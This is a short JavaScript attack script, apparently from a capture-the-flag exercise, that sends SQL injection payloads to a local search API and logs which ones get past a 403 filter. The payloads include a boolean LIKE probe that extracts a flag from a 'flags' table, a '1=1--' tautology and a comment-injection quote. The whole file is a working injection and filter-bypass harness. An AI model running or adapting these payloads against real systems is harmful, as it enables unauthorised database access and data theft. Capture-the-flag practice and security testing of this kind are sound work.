const bypassSearch = async (payload) => {
    const res = await fetch(`http://localhost:4000/api/search?q=${encodeURIComponent(payload)}`);
    if (res.status !== 403) {
      console.log(`[SUCCESS SEARCH] Payload: ${payload} | Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED SEARCH] Payload: ${payload}`);
    }
};

const run = async () => {
    await bypassSearch("%' AND (SELECT flag_value FROM flags) LIKE 'CTF{%");
    await bypassSearch("%' AND 1=1--");
    // What if we use a different structure?
    await bypassSearch("a'/*");
};

run();
